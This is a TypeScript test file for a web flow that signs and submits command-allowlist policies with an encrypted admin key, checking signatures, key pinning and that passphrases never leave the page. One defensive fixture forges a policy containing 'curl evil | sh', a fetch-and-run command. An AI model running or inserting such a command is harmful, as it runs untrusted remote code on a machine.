import { applyPolicy, encryptAdminKey, generateSigningKeyPair, keyId, nextPolicyBody as coreNext, signNoticeRecipients as coreSignList, signPolicy as coreSignPolicy, verifyInboxDocument, verifyNoticeRecipients as coreVerifyList, type SignedNoticeRecipients, type PolicyBody, type SignedPolicy } from '@wadeck-app/machine-core';
import { describe, expect, it, vi } from 'vitest';
import { loadContext, prepareAllow, signAndSubmitAllow, type AllowApi, type AllowContext } from './allowFlow.js';

// The flow of the Allow button without React: context, preview, unlock, signature, post. Real crypto (each unlock derives 600 000 PBKDF2 rounds:
// a few in this file, not more). The server side is a recording stub, so the tests can read EVERY byte that leaves the page.

const PASSPHRASE = 'correct horse battery staple 7391';
const NOW = Math.floor(Date.now() / 1000);
const SELF = '22222222-2222-4222-8222-222222222222';
const PEER = '11111111-1111-4111-8111-111111111111';
const SHELL = 'sh';

const admin = generateSigningKeyPair();
const ADMIN_KEY_ID = keyId(admin.publicKey);
const keyFile = JSON.stringify(encryptAdminKey(admin, PASSPHRASE));

const signedBase = (version: number, defaults: PolicyBody['defaults'] = [], peers: PolicyBody['peers'] = {}, key = admin): SignedPolicy =>
  coreSignPolicy({ v: 1, target: SELF, version, baseVersion: version - 1, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 60, notBefore: NOW - 60, notAfter: NOW + 86400, defaults, peers }, key.privateKeyPkcs8);

function context(over: Partial<AllowContext> = {}): AllowContext {
  return { ok: true, target: { uuid: SELF, name: 'desktop' }, toSelf: true, policyMode: 'admin', adminKeyId: ADMIN_KEY_ID, adminPublicKey: admin.publicKey, current: null, source: 'installed on this machine', delivery: 'install', ...over };
}

interface Sent { method: string; path: string; body?: unknown }
function stubApi(answers: { get?: Record<string, unknown>; post?: unknown } = {}): AllowApi & { sent: Sent[]; elevated: number } {
  const sent: Sent[] = [];
  const api = {
    sent,
    elevated: 0,
    async elevate() { api.elevated++; },
    async get(path: string) {
      sent.push({ method: 'GET', path });
      const answer = answers.get?.[path];
      if (answer instanceof Error) throw answer;
      if (answer === undefined) throw new Error(`no stub for GET ${path}`);
      return answer;
    },
    async post(path: string, body: unknown) {
      sent.push({ method: 'POST', path, body });
      if (answers.post instanceof Error) throw answers.post;
      return answers.post ?? { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 1, delivery: 'installed' };
    },
  };
  return api;
}

describe('loadContext', () => {
  it('asks for the PIN first, then reads the context of the machine and returns it', async () => {
    const api = stubApi({ get: { [`/allow/${SELF}`]: context() } });
    const loaded = await loadContext(api, SELF);
    expect(api.elevated).toBe(1);
    expect(api.sent).toEqual([{ method: 'GET', path: `/allow/${SELF}` }]);
    expect(loaded.target.name).toBe('desktop');
  });

  it('a cancelled PIN is reported as it is and nothing else is read', async () => {
    const api = stubApi();
    api.elevate = async () => { throw new Error('Sensitive action cancelled: PIN not entered'); };
    await expect(loadContext(api, SELF)).rejects.toThrow('PIN not entered');
    expect(api.sent).toEqual([]);
  });

  it('refuses an answer that is not a context, with the fix (an older module backend)', async () => {
    const api = stubApi({ get: { [`/allow/${SELF}`]: { nope: 1 } } });
    await expect(loadContext(api, SELF)).rejects.toThrow(/unexpected answer.*update the machine module/s);
  });
});

describe('prepareAllow (what the confirmation shows, before any passphrase)', () => {
  it('from no policy: version 0 -> 1, the one entry added, for every trusted peer', async () => {
    const prepared = await prepareAllow(context(), { shell: SHELL, command: 'uptime' }, NOW);
    expect(prepared).toMatchObject({ changed: true, fromVersion: 0, toVersion: 1, added: [{ shell: SHELL, command: 'uptime' }], defaultCount: 1, peersWithOwnList: [] });
  });

  it('from a policy it can verify: version + 1, and the peers that keep their own list are named', async () => {
    const current = signedBase(3, [{ shell: SHELL, command: 'ls' }], { [PEER]: [{ shell: SHELL, command: 'ls' }] });
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime' }, NOW);
    expect(prepared).toMatchObject({ changed: true, fromVersion: 3, toVersion: 4, defaultCount: 2, peersWithOwnList: [PEER] });
  });

  it('already allowed: nothing to sign, said as such', async () => {
    const current = signedBase(1, [{ shell: SHELL, command: 'uptime' }]);
    expect(await prepareAllow(context({ current }), { shell: SHELL, command: 'uptime' }, NOW)).toEqual({ changed: false, reason: 'already-allowed' });
  });

  it('REFUSES a base the pinned admin key did not sign (a hostile backend must not slip entries into what the admin signs)', async () => {
    const forger = generateSigningKeyPair();
    const forged = signedBase(2, [{ shell: SHELL, command: 'curl evil | sh' }], {}, forger);
    await expect(prepareAllow(context({ current: forged }), { shell: SHELL, command: 'uptime' }, NOW)).rejects.toThrow(/not signed by the admin key pinned on this machine/);
  });

  it('refuses a base written for another machine', async () => {
    const other = coreSignPolicy({ ...signedBase(1).body, target: PEER }, admin.privateKeyPkcs8);
    await expect(prepareAllow(context({ current: other }), { shell: SHELL, command: 'uptime' }, NOW)).rejects.toThrow(/another machine/);
  });

  it('refuses a command text the policy cannot hold, naming the problem', async () => {
    await expect(prepareAllow(context(), { shell: SHELL, command: '' }, NOW)).rejects.toThrow(/must not be empty/);
    await expect(prepareAllow(context(), { shell: SHELL, command: 'echo é' }, NOW)).rejects.toThrow(/printable ASCII/);
  });

  it('refuses a shell that is not one of cmd, ps, bash, sh', async () => {
    await expect(prepareAllow(context(), { shell: 'zsh', command: 'ls' }, NOW)).rejects.toThrow(/shell must be one of/);
  });
});

describe('signAndSubmitAllow', () => {
  it('this machine: unlocks in the page, signs, posts ONLY the signed policy; machine-core accepts it and the passphrase appears nowhere in what was sent', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const ctx = context({ current: signedBase(2, [{ shell: SHELL, command: 'ls' }]) });
    const answer = await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
    expect(answer).toMatchObject({ ok: true, delivery: 'installed' });
    const post = api.sent.find((s) => s.method === 'POST');
    expect(post?.path).toBe('/allow');
    expect(Object.keys(post?.body as object)).toEqual(['policy']);
    const policy = (post?.body as { policy: SignedPolicy }).policy;
    // The very check the daemon of this machine makes (hard rule 4): signature, target, base version.
    const applied = applyPolicy({ version: 2, highestSeen: 2 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF });
    expect(applied.ok).toBe(true);
    expect(policy.body.defaults).toEqual([{ shell: SHELL, command: 'ls' }, { shell: SHELL, command: 'uptime' }]);
    // Everything that left the page, as text: no passphrase, no key material of the admin.
    const everything = JSON.stringify(api.sent);
    expect(everything).not.toContain(PASSPHRASE);
    expect(everything).not.toContain('privateKey');
    expect(Object.keys(post?.body as object)).not.toContain('document');
  }, 120_000);

  it('another machine: also posts the inbox document, which machine-core verifies for that machine, and the policy is the one in it', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ok: true, target: { uuid: PEER, name: 'laptop' }, version: 1, delivery: 'inbox' } });
    const targetKeys = generateSigningKeyPair();
    const ctx = context({ target: { uuid: PEER, name: 'laptop', identityPublicKey: targetKeys.publicKey }, toSelf: false, delivery: 'inbox', source: 'the last one signed here' });
    await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
    const body = api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy; document: unknown };
    expect(Object.keys(body).sort()).toEqual(['document', 'policy']);
    // Sealed to the target (decision 78): the page, the backend and the relay never carry the command in the document.
    expect(JSON.stringify(body.document)).not.toContain('uptime');
    const verified = verifyInboxDocument(body.document, { adminPublicKey: admin.publicKey, selfUuid: PEER, now: NOW, identityPrivateKeyPkcs8: targetKeys.privateKeyPkcs8 });
    expect(verified.ok).toBe(true);
    if (verified.ok && verified.kind === 'policy') expect(verified.policy).toEqual(body.policy);
    expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
  }, 120_000);

  describe('the list of notice recipients rides the Allow of another machine (request-notices.md)', () => {
    const targetKeys = generateSigningKeyPair();
    const inboxContext = (noticeRecipients?: AllowContext['noticeRecipients']) =>
      context({ target: { uuid: PEER, name: 'laptop', identityPublicKey: targetKeys.publicKey }, toSelf: false, delivery: 'inbox', source: 'the last one signed here', ...(noticeRecipients === undefined ? {} : { noticeRecipients }) });
    const answerOk = { ok: true, target: { uuid: PEER, name: 'laptop' }, version: 1, delivery: 'inbox' };
    const storedList = (recipients: string[] = [SELF], key = admin): SignedNoticeRecipients => coreSignList({ v: 1, adminKeyId: ADMIN_KEY_ID, serial: NOW - 500, issuedAt: NOW - 500, recipients }, key.privateKeyPkcs8);
    const posted = (api: ReturnType<typeof stubApi>) => api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy; document: unknown; noticeRecipients?: { signed: SignedNoticeRecipients; document: unknown } };

    it('reuses the list stored on the admin machine as it is, sealed to the target, in the same unlock', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'sent' } });
      const stored = storedList();
      const result = await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: stored }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      const body = posted(api);
      expect(Object.keys(body).sort()).toEqual(['document', 'noticeRecipients', 'policy']);
      expect(Object.keys(body.noticeRecipients ?? {}).sort()).toEqual(['document', 'signed']);
      expect(body.noticeRecipients?.signed).toEqual(stored);
      const opened = verifyInboxDocument(body.noticeRecipients?.document, { adminPublicKey: admin.publicKey, selfUuid: PEER, now: NOW, identityPrivateKeyPkcs8: targetKeys.privateKeyPkcs8 });
      expect(opened).toMatchObject({ ok: true, kind: 'notice-recipients' });
      expect(result.noticeRecipients).toBe('sent');
      expect(JSON.stringify(api.sent)).not.toContain(PASSPHRASE);
    }, 120_000);

    it('signs a new list for this machine when none is stored (serial from the clock), and the core verifier accepts it', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'sent' } });
      await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: null }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      const list = posted(api).noticeRecipients?.signed as SignedNoticeRecipients;
      expect(list.body).toMatchObject({ v: 1, adminKeyId: ADMIN_KEY_ID, serial: NOW, recipients: [SELF] });
      expect(coreVerifyList(list, { adminPublicKey: admin.publicKey })).toMatchObject({ ok: true });
    }, 120_000);

    it('REFUSES a stored list the pinned admin key did not sign, before the passphrase is used (a hostile backend cannot make the page vouch for it)', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
      const forged = storedList([PEER], generateSigningKeyPair());
      await expect(signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: forged }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/list of notice recipients.*not signed by the admin key pinned/s);
      expect(api.sent).toEqual([]);
    });

    it('an older module backend (no list in the context): the Allow goes through unchanged and the result says the list was not sent, with the fix', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: answerOk });
      const result = await signAndSubmitAllow(api, inboxContext(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      expect(Object.keys(posted(api)).sort()).toEqual(['document', 'policy']);
      expect(result.noticeRecipients).toBe('skipped');
      expect(result.noticeRecipientsMessage).toMatch(/machine admin notify-to/);
      expect(result.noticeRecipientsMessage).toMatch(/app-core-cli update/);
    }, 120_000);

    it('a list the daemon could not send is carried to the user with its own words', async () => {
      const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: { ...answerOk, noticeRecipients: 'failed', noticeRecipientsMessage: 'the relay did not store the list: run machine admin notify-to' } });
      const result = await signAndSubmitAllow(api, inboxContext({ selfUuid: SELF, current: storedList() }), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW);
      expect(result).toMatchObject({ noticeRecipients: 'failed', noticeRecipientsMessage: 'the relay did not store the list: run machine admin notify-to' });
    }, 120_000);
  });

  it('another machine, but the backend sent no identity key for it: nothing is signed or posted, and the message says to update the module', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const ctx = context({ target: { uuid: PEER, name: 'laptop' }, toSelf: false, delivery: 'inbox' });
    const error = await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW).catch((e: Error) => e);
    expect(error).toBeInstanceOf(Error);
    expect((error as Error).message).toMatch(/identity key of "laptop"/);
    expect((error as Error).message).toMatch(/update the machine module/i);
    // Not even the key file was read: nothing was unlocked.
    expect(api.sent).toEqual([]);
  });

  it('a wrong passphrase posts nothing and does not echo the passphrase', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    const wrong = 'definitely not the passphrase 123';
    const error = await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, wrong, NOW).catch((e: Error) => e);
    expect(error).toBeInstanceOf(Error);
    expect((error as Error).message).toMatch(/wrong passphrase or damaged key file/);
    expect((error as Error).message).not.toContain(wrong);
    expect(api.sent.some((s) => s.method === 'POST')).toBe(false);
  }, 120_000);

  it('refuses a key file that unlocks to another admin key than the one pinned here, before signing anything', async () => {
    const other = generateSigningKeyPair();
    const otherFile = JSON.stringify(encryptAdminKey(other, PASSPHRASE));
    const api = stubApi({ get: { '/admin-key': { file: otherFile } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/not the admin key pinned on this machine/);
    expect(api.sent.some((s) => s.method === 'POST')).toBe(false);
  }, 120_000);

  it('a refusal of the daemon (stale base) reaches the user with its own words', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } }, post: new Error('the policy of "desktop" is at version 1 and this one was edited from version 0: reload the page and allow it again. Nothing was stored or sent') });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/reload the page and allow it again/);
  }, 120_000);

  it('nothing to change: no key file read, no passphrase used, nothing posted', async () => {
    const api = stubApi();
    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'uptime' }]) });
    await expect(signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/already allowed/);
    expect(api.sent).toEqual([]);
  });

  it('an unusable key file answer says what the backend sent wrong', async () => {
    const api = stubApi({ get: { '/admin-key': { nope: 1 } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'uptime' }, PASSPHRASE, NOW)).rejects.toThrow(/unexpected answer.*update the machine module/s);
  });
});

describe('the rule is the one of machine-core', () => {
  it('prepareAllow and machine-core produce the same next body for the same inputs', async () => {
    const current = signedBase(5, [{ shell: SHELL, command: 'ls' }]);
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'df -h' }, NOW);
    const core = coreNext(current.body, { target: SELF, adminKeyId: ADMIN_KEY_ID, now: NOW }, { kind: 'allow', entry: { shell: SHELL, command: 'df -h' } });
    expect(prepared.changed && core.changed ? prepared.body : null).toEqual(core.changed ? core.body : undefined);
  });
});

void vi;
